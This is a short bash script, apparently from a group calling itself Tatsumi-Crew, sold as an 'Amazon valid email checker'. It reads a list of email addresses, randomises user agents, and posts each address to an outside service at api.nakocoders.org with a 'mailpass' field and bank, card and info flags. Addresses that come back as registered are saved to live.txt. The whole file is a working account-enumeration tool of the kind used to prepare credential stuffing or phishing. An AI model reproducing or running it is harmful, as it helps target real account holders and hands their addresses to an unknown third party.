#!/bin/bash
#Tatsumi-Crew & Arvan Apriyana
clear
header(){
waktu=$(date '+%Y-%m-%d %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
BIRU='\033[0;34m'
PUTIH='\033[1;37m'
printf "
${PUTIH}
___________________________________________________________

 ████████╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
 ╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
    ██║   ███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
    ██║   ██╔══██║   ██║   ╚════██║██║   ██║██║╚██╔╝██║██║
    ██║   ██║  ██║   ██║   ███████║╚██████╔╝██║ ╚═╝ ██║██║
    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝
  
               AMAZON VALID EMAIL CHECKER  
                  www.tatsumi-crew.net 
          Bug? contact Me : nako48@cyber00t.biz 
           Facebook : https://fb.com/nako48.jp 
___________________________________________________________
"
}
tatsumi(){
    ua=$(cat ua.txt | sort -R | head -1)
    duration=$SECONDS
    SECONDS=0
    url="http://api.nakocoders.org/amz/check.php"
    ref="http://api.nakocoders.org/amz"
    send=$(curl -s -A "$ua" -e "$ref" -X POST -d "ajax=1&do=check&mailpass=$1%7Cwkwkwkkw&delim=%7C&email=0&bank=0&card=0&info=0" "$url")
    livena=$(echo $send | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ $livena =~ "LIVE" ]]; then
        printf "${HIJAU}[LIVE] $1 [$waktu]\n";
        echo "[LIVE] $1 [$waktu]" >> live.txt
        printf "${NORMAL}"
    else
        printf "${MERAH}[DIE] $1 [$waktu]";
        echo ""
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "==========================================================="
echo "List In This Directory : "
ls
echo "==========================================================="
echo "Delimeter list -> email "
echo -n "Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
if [[ $perSec == '' ]]; then
    read -p "Delay time: " perSecs
    duration=$SECONDS
    echo "[$header] ========= $perSec Please. $(($duration / 3600)) Wait $(($duration / 60)) ========= $(($duration % 60)) "
    sleep $perSec
fi
    x=$(gawk '{ print $1 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailna=($x)'
for (( i = 0; i < "${#emailna[@]}"; i++ )); do
        scanskrngah="${emailna[$i]}"
        tatsumi $scanskrngah
done
